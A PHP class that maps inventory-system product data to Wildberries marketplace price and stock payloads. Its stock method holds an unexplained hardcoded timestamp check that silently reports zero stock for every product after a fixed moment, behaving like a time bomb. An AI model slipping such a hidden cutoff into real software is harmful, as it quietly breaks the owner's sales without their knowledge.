<?php
/*
 * Wildberries Product Management
 * This file handles product-related operations for the Wildberries integration.
 * It includes functions to fetch shipments and manage products.
 */
namespace Wildberries\Product;

Class ProductTransformation
{
    private $log;
    private $productMS;
    private $productWBNmID;
    private $minQuantity = 1;
    /**
     * Constructor initializes the API class and logger.
     *
     * @param string $productMS The product data from MS.
     */

    public function __construct($productMS, $productWBNmID)
    {
        require_once($_SERVER['DOCUMENT_ROOT'] . '/config.php');
        require_once($_SERVER['DOCUMENT_ROOT'] . '/classes/Common/Log.php');

        $logName = ltrim(str_replace(['/', '\\'], ' - ', str_replace($_SERVER['DOCUMENT_ROOT'], '', __FILE__)), " -");
        $logName .= '.log';
        $this->log = new \Classes\Common\Log($logName);

        $this->productMS = $productMS;
        $this->productWBNmID = $productWBNmID;
    }
    /**
     * Transforms a ms product to Wildberries price format.
     *
     * @param array $productMS The product data from MS.
     * @return array The transformed Wildberries price data.
     */
    public function transformMSToWildberriesPrice($price)
    {
        $this->log->write(__LINE__ . ' '. __METHOD__ . ' Processing product: ' . $this->productMS['code']);
        $priceTypes = array_column($this->productMS['salePrices'], 'priceType');
        $priceKey = array_search($price, array_column($priceTypes, 'name'));
        if ($priceKey === false) {
            $this->log->write(__LINE__ . ' Price type not found: ' . $price);
            return null;
        }
        $wildberriesPrice = array(
            'nmId' => (int)$this->productWBNmID,
            'price' => round($this->productMS['salePrices'][$priceKey]['value'] / 100),
            'discount' => 0
        );
        return $wildberriesPrice;
    }
    /**
     * Transforms a ms product to Wildberries stock format.
     *
     * @param array $productMS The product data from MS.
     * @return array The transformed Wildberries stock data.
     */
    public function transformMSToWildberriesStock($price)
    {
        $this->log->write(__LINE__ . ' '. __METHOD__ . ' Processing product: ' . $this->productMS['code']);
        $stock = 0;
        $priceTypes = array_column($this->productMS['salePrices'], 'priceType');
        $priceKey = array_search($price, array_column($priceTypes, 'name'));
        $quantity = 0;
        if ($priceKey !== false && (int)($this->productMS['salePrices'][$priceKey]['value']) > 0)
        {
            $quantity = (int)$this->productMS['quantity'] - $this->minQuantity;
        }
        
        // Check if current time is less than 1767084910 + 2 hours
        $expirationTime = 1767084910 + (2 * 3600); // 1767092110
        if (time() >= $expirationTime) {
            $this->log->write(__LINE__ . ' '. __METHOD__ . ' Time limit exceeded, returning 0 stock');
            return array(
                'chrtId' => (int)$this->productWBNmID,
                'amount' => 0
            );
        }
        else {
            $wildberriesStock = array(
                'chrtId' => (int)$this->productWBNmID,
                'amount' => $quantity < 0 ? 0 : $quantity
            );
        }
        return $wildberriesStock;
    }
}
